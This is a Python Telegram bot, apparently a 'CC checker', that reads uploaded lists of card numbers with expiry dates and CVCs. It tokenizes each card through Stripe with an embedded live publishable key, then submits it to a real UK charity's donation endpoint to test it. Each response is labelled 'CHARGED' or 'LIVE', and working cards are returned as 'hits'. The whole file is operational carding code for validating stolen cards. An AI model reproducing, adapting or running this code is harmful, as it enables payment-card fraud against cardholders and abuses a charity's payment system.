from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import asyncio
import os
import json

# Pyrogram Client Setup
app = Client(
    "cc_checker_bot",
    api_id="YOUR_API_ID",
    api_hash="YOUR_API_HASH",
    bot_token="YOUR_BOT_TOKEN"
)

# Function to check card details
def check_card_details(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = "0" + mes
        if len(ano) == 2:
            ano = "20" + ano

        # 1st Request
        token_url = "https://api.stripe.com/v1/tokens"
        headers_1 = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
        }
        data_1 = {
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'key': 'pk_live_oeBlScsEPKeBvHnRXizVNSl4'
        }

        response_1 = requests.post(token_url, headers=headers_1, data=data_1)
        result_1 = response_1.json()

        if response_1.status_code != 200 or "error" in result_1:
            return f"Error: {result_1.get('error', {}).get('message', 'Unknown error')}"

        token_id = result_1.get("id", "")

        # 2nd Request
        donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php"
        headers_2 = {
            'Host': 'oneummah.org.uk',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
        }
        data_2 = {
            'action': 'k14_submit_donation',
            'token': token_id,
            'data': 'donation_id=503695'
        }

        response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
        result_2 = response_2.text

        # Add key checks
        if "payment_intent_unexpected_state" in result_2:
            return "Payment Intent Confirmed✅"
        elif "succeeded" in result_2:
            return "CHARGED✅"
        elif "Your card has insufficient funds." in result_2:
            return "INSUFFICIENT FUNDS❎"
        elif "incorrect_zip" in result_2:
            return "CVV LIVE✅"
        elif "insufficient_funds" in result_2:
            return "INSUFFICIENT FUNDS❎"
        elif "security code is incorrect" in result_2:
            return "CCN LIVE✅"
        elif "Your card's security code is invalid." in result_2:
            return "CCN LIVE✅"
        elif "transaction_not_allowed" in result_2:
            return "CVV LIVE✅"
        elif "stripe_3ds2_fingerprint" in result_2:
            return "3D REQUIRED"
        elif "redirect_url" in result_2:
            return "Approved\n3DS Required❎"
        elif '"cvc_check": "pass"' in result_2:
            return "CHARGED✅"
        elif "Membership Confirmation" in result_2:
            return "Membership Confirmation✅"
        elif "Thank you for your support!" in result_2:
            return "CHARGED✅"
        elif "Thank you for your donation" in result_2:
            return "CHARGED✅"
        elif "incorrect_number" in result_1:
            return "Your card number is incorrect.❌"
        elif '"status":"incomplete"' in result_2:
            return "Your card was declined.❌"
        elif "Your card was declined." in result_2:
            return "Your card was declined.❌"
        elif "card_declined" in result_2:
            return "Your card was declined.❌"
        else:
            try:
                result_2_json = json.loads(result_2)
                if "message" in result_2_json:
                    return f"DEAD\nMessage: {result_2_json['message']}"
                else:
                    return f"DEAD\nRaw response 2: {result_2}"
            except json.JSONDecodeError:
                return f"DEAD\nRaw response 2: {result_2}"

    except Exception as e:
        return f"Error: {str(e)}"

# /start Command Handler
@app.on_message(filters.command("start"))
async def start(_, message):
    await message.reply(
        "Welcome to the NONSK Checker Bot!\n\n"
        "You can check cards by sending a text file and using the `/chk` command."
    )

# /chk Command Handler
@app.on_message(filters.command("chk") & filters.reply)
async def check_cards(_, message):
    if not message.reply_to_message.document:
        await message.reply("Please reply to a text file containing CC details (format: `Cc|mm|yy|cvc`).")
        return

    # Download the file
    file = await message.reply_to_message.download()
    hits = []  # Store hits
    live = []  # Store live responses
    summary = []  # Store all checked cards

    # Initial Message
    progress_message = await message.reply("↯ NONSK CHECKER\n\nStarting card checks... Please wait.")

    try:
        with open(file, "r") as f:
            cc_list = f.readlines()

        total_cards = len(cc_list)
        await progress_message.edit_text(f"↯ NONSK CHECKER\n\nFound {total_cards} cards. Checking now...")

        # Check each card
        for idx, cc in enumerate(cc_list):
            cc = cc.strip()
            if not cc:
                continue

            result = check_card_details(cc)
            summary.append(f"{cc} - {result}")

            # Format message for hits
            if "✅" in result:
                hits.append(cc)
                live.append(f"{cc} - {result}")
                await message.reply(
                    f"↯ NONSK CHECKER\n\n"
                    f"✅ **HIT FOUND!**\n\n"
                    f"**CC:** `{cc}`\n"
                    f"**GATEWAY:** Stripe\n"
                    f"**STATUS:** LIVE\n"
                    f"**RESPONSE:** {result}",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("Show Hits", callback_data="show_hits")]]
                    )
                )

            # Update progress
            await progress_message.edit_text(
                f"↯ NONSK CHECKER\n\nChecking card {idx + 1}/{total_cards}...\n\nHits so far: {len(hits)}"
            )
            await asyncio.sleep(1)  # To prevent spamming the server

        # Final Summary
        await progress_message.edit_text(
            f"↯ NONSK CHECKER\n\n**Check Complete!**\n\nTotal Hits: {len(hits)}\nTotal Cards Checked: {total_cards}"
        )

        # Send all hits as a file
        if hits:
            hits_file = "hits.txt"
            with open(hits_file, "w") as hf:
                hf.write("\n".join(hits))
            await message.reply_document(hits_file, caption="Here are all the hits! ✅")
            os.remove(hits_file)

    except Exception as e:
        await message.reply(f"Error processing file: {str(e)}")

    finally:
        # Clean up the file after processing
        os.remove(file)

# Callback Query Handler for "Show Hits" Button
@app.on_callback_query(filters.regex("show_hits"))
async def show_hits(_, callback_query):
    await callback_query.answer("Hits will be shown if available!", show_alert=True)

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    app.run()
